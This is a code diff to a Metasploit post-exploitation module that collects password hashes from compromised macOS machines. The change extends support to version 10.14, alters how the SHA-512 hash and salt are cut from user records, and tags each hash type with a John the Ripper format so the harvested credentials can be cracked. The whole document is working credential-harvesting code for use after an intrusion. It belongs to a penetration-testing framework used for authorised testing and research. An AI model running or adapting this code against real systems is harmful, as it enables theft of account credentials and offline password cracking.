@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Post
         'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
         'Description'   => %q{
             This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports
-            versions 10.3 to 10.9.
+            versions 10.3 to 10.14.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [
@@ -87,7 +87,11 @@ class MetasploitModule < Msf::Post
         end
 
         # slice out the sha512 hash + salt
-        sha512 = hash_decoded.scan(/^\w*4f1044(\w*)(080b190|080d101e31)/)[0][0]
+        # original regex left for historical purposes.  During testing it was discovered that
+        # 4f110200 was also a valid end.  Instead of looking for the end, since its a hash (known
+        # length) we can just set the length
+        #sha512 = hash_decoded.scan(/^\w*4f1044(\w*)(080b190|080d101e31)/)[0][0]
+        sha512 = hash_decoded.scan(/^\w*4f1044(\w{136})/)[0][0]
         report_hash("SHA-512", sha512, user)
       else # 10.6 and below
         # On 10.6 and below, SHA-1 is used for encryption
@@ -175,14 +179,26 @@ class MetasploitModule < Msf::Post
     when "NT"
       private_data = "#{Metasploit::Credential::NTLMHash::BLANK_LM_HASH}:#{hash}"
       private_type = :ntlm_hash
+      jtr_format = 'ntlm'
     when "LM"
       private_data = "#{hash}:#{Metasploit::Credential::NTLMHash::BLANK_NT_HASH}"
       private_type = :ntlm_hash
-    when "SHA-512 PBKDF2", "SHA-512", "SHA-1"
+      jtr_format = 'lm'
+    when "SHA-512 PBKDF2"
       private_data = hash
       private_type = :nonreplayable_hash
+      jtr_format = 'PBKDF2-HMAC-SHA512'
+    when "SHA-512"
+      private_data = hash
+      private_type = :nonreplayable_hash
+      jtr_format = 'xsha512'
+    when "SHA-1"
+      private_data = hash
+      private_type = :nonreplayable_hash
+      jtr_format = 'xsha'
     end
     create_credential(
+      jtr_format: jtr_format,
       workspace_id: myworkspace_id,
       origin_type: :session,
       session_id: session_db_id,
